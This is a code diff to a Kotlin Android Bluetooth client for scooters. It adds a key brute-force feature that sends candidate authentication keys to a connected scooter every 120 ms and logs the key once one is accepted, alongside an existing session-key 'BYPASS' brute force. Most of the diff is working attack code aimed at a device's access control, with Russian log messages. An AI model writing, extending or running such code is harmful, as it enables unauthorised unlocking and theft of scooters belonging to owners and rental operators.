@@ -60,7 +60,9 @@ object ScooterClient : BleTransport.Listener {
     private const val AUTH_TIMEOUT_MS = 3000L
     private const val UNLOCK_TIMEOUT_MS = 3000L
     private const val BYPASS_TAG = "BYPASS"
+    private const val KEYBRUTE_TAG = "KEYBRUTE"
     private const val BRUTE_INTERVAL_MS = 30L
+    private const val KEY_BRUTE_INTERVAL_MS = 120L
     private const val NOTIFY_LIMIT = 120
 
     private const val CHAR_BATTERY = "00002a19-0000-1000-8000-00805f9b34fb"
@@ -95,6 +97,12 @@ object ScooterClient : BleTransport.Listener {
     private var bruteKey = 0
     private var bruteCurrent = -1
     private var bruteRunnable: Runnable? = null
+    private var keyBruteRunning = false
+    private var keyBruteCandidates: List<String> = emptyList()
+    private var keyBruteIndex = 0
+    private var keyBruteTried = 0
+    private var keyBruteRunnable: Runnable? = null
+    private var authFromBrute = false
     private var reconnectAttempts = 0
     private var reconnectRunnable: Runnable? = null
     private var linkLost = true
@@ -511,6 +519,7 @@ object ScooterClient : BleTransport.Listener {
     }
 
     fun stopKeyBrute() {
+        stopKeyStringBrute()
         if (!bruteRunning) return
         bruteRunning = false
         bruteRunnable?.let { handler.removeCallbacks(it) }
@@ -518,6 +527,81 @@ object ScooterClient : BleTransport.Listener {
         bruteCurrent = -1
         LogBus.info(BYPASS_TAG, "Перебор остановлен")
     }
+
+    fun startKeyStringBrute() {
+        if (activeKind != DeviceKind.SCOOTER) {
+            LogBus.warn(KEYBRUTE_TAG, "Команда только для самоката")
+            return
+        }
+        if (!isConnected()) {
+            LogBus.warn(KEYBRUTE_TAG, "Нет подключения")
+            return
+        }
+        if (keyBruteRunning) return
+        stopKeyBrute()
+        cancelUnlock()
+        bypassPending = false
+        val candidates = ScooterCodec.keyCandidates(deviceName, prefs.bleKey)
+        if (candidates.isEmpty()) {
+            LogBus.warn(KEYBRUTE_TAG, "Нет кандидатов для перебора")
+            return
+        }
+        keyBruteCandidates = candidates
+        keyBruteIndex = 0
+        keyBruteTried = 0
+        keyBruteRunning = true
+        authFromBrute = true
+        LogBus.warn(KEYBRUTE_TAG, "Перебор ключей, кандидатов ${candidates.size}")
+        val runnable = object : Runnable {
+            override fun run() {
+                if (!keyBruteRunning) return
+                if (!isConnected()) {
+                    stopKeyStringBrute()
+                    return
+                }
+                if (keyBruteIndex >= keyBruteCandidates.size) {
+                    stopKeyStringBrute()
+                    LogBus.warn(KEYBRUTE_TAG, "Перебор завершен без успеха, проверено $keyBruteTried")
+                    return
+                }
+                val candidate = keyBruteCandidates[keyBruteIndex]
+                keyBruteIndex += 1
+                keyBruteTried += 1
+                sendBruteKey(candidate)
+                if (keyBruteRunning) handler.postDelayed(this, KEY_BRUTE_INTERVAL_MS)
+            }
+        }
+        keyBruteRunnable = runnable
+        handler.post(runnable)
+    }
+
+    private fun sendBruteKey(candidate: String) {
+        authKey = candidate
+        authTried.add(candidate)
+        authPending = true
+        _state.value = ClientState.AUTHENTICATING
+        LogBus.verbose(KEYBRUTE_TAG, "Кандидат $keyBruteTried/${keyBruteCandidates.size}")
+        if (!writeFrame(ScooterCodec.keyCommand(candidate), null)) {
+            authPending = false
+        }
+    }
+
+    fun stopKeyStringBrute() {
+        if (!keyBruteRunning) {
+            authFromBrute = false
+            return
+        }
+        keyBruteRunning = false
+        keyBruteRunnable?.let { handler.removeCallbacks(it) }
+        keyBruteRunnable = null
+        authFromBrute = false
+        authPending = false
+        keyBruteIndex = 0
+        keyBruteTried = 0
+        LogBus.info(KEYBRUTE_TAG, "Перебор ключей остановлен")
+    }
+
+    val keyBruteActive: Boolean get() = keyBruteRunning
 
     private fun acceptSessionKey(key: Int, message: String) {
         sessionKey = key
@@ -655,7 +739,7 @@ object ScooterClient : BleTransport.Listener {
     private fun writeFrame(frame: ByteArray, label: String?): Boolean {
         val ok = transport?.write(frame) == true
         if (ok) {
-            LogBus.tx("TX", buildString {
+            LogBus.verbose("TX", buildString {
                 if (label != null) append(label).append(": ")
                 append(hex(frame))
             })
@@ -760,7 +844,7 @@ object ScooterClient : BleTransport.Listener {
             processFrame(data)
             return
         }
-        LogBus.rx("RX", "${shortUuid(uuid)}: ${hex(data)}")
+        LogBus.verbose("RX", "${shortUuid(uuid)}: ${hex(data)}")
         appendNotification(uuid, data)
         updateRemote(uuid, data)
     }
@@ -889,7 +973,7 @@ object ScooterClient : BleTransport.Listener {
     }
 
     private fun handleFrame(frame: ScooterFrame) {
-        LogBus.rx("RX", "CMD=${hexByte(frame.cmd)} ${hex(frame.raw)}")
+        LogBus.verbose("RX", "CMD=${hexByte(frame.cmd)} ${hex(frame.raw)}")
         when (frame.cmd) {
             ScooterCodec.CMD_KEY -> handleAuthFrame(frame)
             ScooterCodec.CMD_ERROR -> {
@@ -1039,18 +1123,28 @@ object ScooterClient : BleTransport.Listener {
         authPending = false
         authTimeout?.let { handler.removeCallbacks(it) }
         authTimeout = null
-        if (frame.payload.size >= 2 && (frame.payload[0].toInt() and 0xFF) == 1) {
+        val accepted = frame.payload.size >= 2 && (frame.payload[0].toInt() and 0xFF) == 1
+        if (accepted) {
             sessionKey = frame.payload[1].toInt() and 0xFF
             authenticated = true
             reconnectAttempts = 0
             if (prefs.bleKey != authKey) prefs.bleKey = authKey
             _incompatible.value = _incompatible.value - deviceAddress
-            LogBus.ok(AUTH_TAG, "Ключ верный, сессионный ключ 0x${hexByte(sessionKey)}")
+            if (authFromBrute) {
+                stopKeyStringBrute()
+                LogBus.ok(KEYBRUTE_TAG, "Ключ найден за $keyBruteTried попыток, сессионный ключ 0x${hexByte(sessionKey)}")
+            } else {
+                LogBus.ok(AUTH_TAG, "Ключ верный, сессионный ключ 0x${hexByte(sessionKey)}")
+            }
             _state.value = ClientState.READY
             onAuthenticated()
-        } else {
-            tryNextAuthKey("Ключ отклонен")
+            return
         }
+        if (authFromBrute) {
+            LogBus.verbose(KEYBRUTE_TAG, "Отклонено, попыток $keyBruteTried")
+            return
+        }
+        tryNextAuthKey("Ключ отклонен")
     }
 
     private fun onAuthenticated() {
